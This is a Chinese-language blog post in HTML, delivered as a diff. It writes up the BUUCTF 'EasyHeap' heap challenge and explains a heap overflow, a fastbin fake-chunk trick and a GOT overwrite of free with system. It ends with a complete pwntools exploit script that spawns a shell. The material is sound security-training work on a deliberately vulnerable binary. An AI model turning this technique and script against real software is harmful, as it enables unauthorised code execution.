@@ -1,0 +1,650 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目简介BUUCTF一道堆题，链接见：BUUCTF：EasyHeap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-easyheap">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/10/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介BUUCTF一道堆题，链接见：BUUCTF：EasyHeap">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-create.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-edit.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-delete.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/fake-size-byte.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-l33t.png">
+<meta property="article:published_time" content="2025-10-01T11:57:35.000Z">
+<meta property="article:modified_time" content="2025-10-05T08:06:46.500Z">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/checksec.png">
+  
+  
+  
+  <title>BUUCTF-easyheap - 0x4A</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x4A</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Istaroth.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF-easyheap"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-01 19:57" pubdate>
+          October 1, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          905 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF-easyheap</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF一道堆题，链接见：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">BUUCTF：EasyHeap</a><br></p>
+<span id="more"></span>
+<p>主要通过这道题进一步了解覆写GOT表这种之前没怎么接触过的利用手法<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec，发现除了PIE全部开启，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/checksec.png" srcset="/img/loading.gif" lazyload><br>之后进入IDA，发现是个菜单程序，同时存在malloc和free，是个堆题，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-main.png" srcset="/img/loading.gif" lazyload><br>之后寻找溢出点，首先看到create功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-create.png" srcset="/img/loading.gif" lazyload><br>然后对比观察edit功能，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-edit.png" srcset="/img/loading.gif" lazyload><br>发现在edit的时候又询问了一次堆块长度，因此这里存在溢出<br><br>最后再看一下delete，free后会置空，没有UAF：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-delete.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>找到了溢出漏洞点，首先想办法拿任意地址写<br><br>思路为：申请超过1个的堆块，free掉后面几个，然后溢出第一个堆块去改后面堆块的fd指针，然后再malloc<br><br>但是这里需要注意fast bin的检查机制，主要如下所示：<br></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>	      <span class="hljs-keyword">if</span> (__glibc_unlikely (victim_idx != idx))<br>		malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>	      check_remalloced_chunk (av, victim, nb);<br></code></pre></td></tr></table></figure>
+<p>可以看到，fast bin在申请时，会检查 <em><strong>size字段是否属于当前bin规定的大小</strong></em> ，因此我们需要先办法用一次字节错位去伪造大小；同时，要注意 <em><strong>fast bin的fd指针，应该是指向chunk的头部，而不是数据区的头部</strong></em> <br><br>至于如何找错位字节，需要动态调试，如下图所示，想办法在heaparray上方找到了一个0x7f的错位字节：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/fake-size-byte.png" srcset="/img/loading.gif" lazyload><br>而且可以看到这里的0x7f是标准输入输出的地址，一般不会改变，因此我们可以malloc到heaparray上方，然后溢出覆盖heaparray实现任意地址写<br><br>ok，拿到了任意地址写，但具体该写哪里？<br>首先注意到main函数里有一个magic变量，位于bss段，如果该变量校验正确会调用一个l33t函数，发现这个函数会执行一个类似cat flag的命令，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-l33t.png" srcset="/img/loading.gif" lazyload><br>于是考虑覆盖bss段的magic去通过检查，但是经过打远程发现，这个路径是错误的，没有flag，看来这是一个假的后门函数<br><br>接下来考虑直接拿shell，这里注意checksec中的结果为Partial RELRO，考虑覆盖GOT表<br><br>至于覆盖哪个函数，由于能输入控制的地方是heaparray数组，而恰好free函数以该处指针作为第一个参数<br><br>因此首先在0x6020ad错位字节malloc一个chunk，然后覆盖heaparray第一次任意地址写free函数的GOT表；<br><br>第二次任意地址将heaparray+1的地方填入&#x2F;bin&#x2F;sh<br><br>最后再free掉1号堆块<br><br>最终的exp如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;/home/k40/Pwn/Exercise/EasyHeap/easyheap&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29633</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF)<br>        <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CreateHeap</span>(<span class="hljs-params">io,size,payload=<span class="hljs-string">&quot;AAA&quot;</span></span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    io.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">EditHeap</span>(<span class="hljs-params">io,index,size,payload=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;2&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    io.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">DeleteHeap</span>(<span class="hljs-params">io,index</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;3&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br><br>elf=ELF(targetELF)<br>systemPLT=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>freeGOT=elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br>ioTube=Lauch(DEBUG)<br><br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br><br>DeleteHeap(ioTube,<span class="hljs-number">2</span>)<br>DeleteHeap(ioTube,<span class="hljs-number">1</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x60</span>+<span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0x7f</span>)+p64(<span class="hljs-number">0x6020ad</span>)<br>EditHeap(ioTube,<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>,payload)<br><br><br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">35</span>+p64(freeGOT)<br>EditHeap(ioTube,<span class="hljs-number">2</span>,<span class="hljs-number">59</span>,payload)<br><br>EditHeap(ioTube,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(systemPLT))<br>EditHeap(ioTube,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>DeleteHeap(ioTube,<span class="hljs-number">1</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">pwn刷题记录</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/" class="category-chain-item">其他技巧类</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/" class="category-chain-item">覆写GOT表</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF-easyheap</div>
+      <div>http://0x4a-210.github.io/2025/10/01/pwn刷题记录/其他技巧类/覆写GOT表/BUUCTF-easyheap/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 1, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/03/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/" title="2025-10-02-OPENECSC-cfp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025-10-02-OPENECSC-cfp</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-orange/" title="House-of-Orange">
+                        <span class="hidden-mobile">House-of-Orange</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
